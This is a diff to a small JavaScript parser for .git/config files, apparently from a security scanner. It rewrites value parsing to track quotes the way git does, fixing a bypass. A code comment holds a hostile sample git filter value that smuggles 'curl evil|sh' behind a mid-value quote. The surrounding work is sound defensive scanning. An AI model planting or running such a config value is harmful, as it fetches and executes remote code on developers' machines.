@@ -1,8 +1,53 @@
 // Minimal .git/config (INI-style) parser. No dependencies on purpose: a security
 // scanner should not pull a supply chain of its own.
 //
-// Handles: [section], [section "subsection"], key = value, quoted values,
-// comments, and line continuations ending in a backslash.
+// The value scanner is a single pass with quote state, because git's is. The
+// previous version stripped comments first and unquoted afterwards, which meant a
+// quote opened halfway through a value was invisible to it:
+//
+//     clean = cat" ; curl evil|sh"
+//     git reads:  cat ; curl evil|sh      <- and runs it
+//     we read:    cat"                    <- and called it a bare command
+//
+// Anything that decides where a value ends has to know whether it is inside
+// quotes at that point. That is the whole finding (review 02, N-2).
+
+const ESCAPES = { n: '\n', t: '\t', b: '\b', '"': '"', '\\': '\\' };
+
+/**
+ * Read one config value the way git does.
+ * Outside quotes: `#` and `;` start a comment, a tab is recorded as a space, and
+ * trailing whitespace is dropped. Inside quotes: everything is literal except
+ * a backslash escape. Quoted and unquoted runs concatenate.
+ */
+export function parseValue(raw) {
+  let out = '';
+  let inQuotes = false;
+  let pendingSpace = '';        // whitespace held back until we know more follows
+
+  for (let i = 0; i < raw.length; i++) {
+    const ch = raw[i];
+
+    if (ch === '\\') {
+      const next = raw[++i];
+      if (next === undefined) break;                 // trailing backslash: git continues the line
+      out += pendingSpace; pendingSpace = '';
+      out += Object.hasOwn(ESCAPES, next) ? ESCAPES[next] : next;
+      continue;
+    }
+
+    if (ch === '"') { inQuotes = !inQuotes; out += pendingSpace; pendingSpace = ''; continue; }
+
+    if (!inQuotes) {
+      if (ch === '#' || ch === ';') break;           // comment, but only out here
+      if (ch === ' ' || ch === '\t') { pendingSpace += ' '; continue; }
+    }
+
+    out += pendingSpace; pendingSpace = '';
+    out += ch;
+  }
+  return out;
+}
 
 export function parseGitConfig(text) {
   const entries = [];
@@ -26,31 +71,16 @@ export function parseGitConfig(text) {
     }
 
     // Join backslash continuations the way git does: the next line is appended
-    // verbatim, leading whitespace included. Trimming it here produced a value
-    // git never sees (found by the golden table).
-    while (line.endsWith('\\') && i + 1 < lines.length) {
+    // verbatim, leading whitespace included.
+    while (line.endsWith('\\') && !line.endsWith('\\\\') && i + 1 < lines.length) {
       line = line.slice(0, -1) + lines[++i].replace(/\s+$/, '');
     }
 
-    const kv = line.match(/^([A-Za-z][A-Za-z0-9-]*)\s*(?:=\s*(.*))?$/);
+    const kv = line.match(/^([A-Za-z][A-Za-z0-9-]*)\s*(?:=\s*([\s\S]*))?$/);
     if (!kv || section === null) continue;
 
     const key = kv[1].toLowerCase();
-    let value = (kv[2] ?? 'true').trim();
-
-    // strip trailing inline comment when it is not inside quotes
-    if (!value.startsWith('"')) {
-      const hash = value.search(/\s[#;]/);
-      if (hash !== -1) value = value.slice(0, hash).trim();
-    }
-    if (value.length > 1 && value.startsWith('"') && value.endsWith('"')) {
-      value = value.slice(1, -1).replace(/\\(.)/g, '$1');
-    } else {
-      // Outside quotes git records a tab as a plain space (verified against
-      // git 2.43 in the golden table). Keeping the tab produced a value git
-      // never reads.
-      value = value.replace(/\t/g, ' ');
-    }
+    const value = kv[2] === undefined ? 'true' : parseValue(kv[2]);
 
     entries.push({ section, subsection, key, value, line: lineNumber });
   }
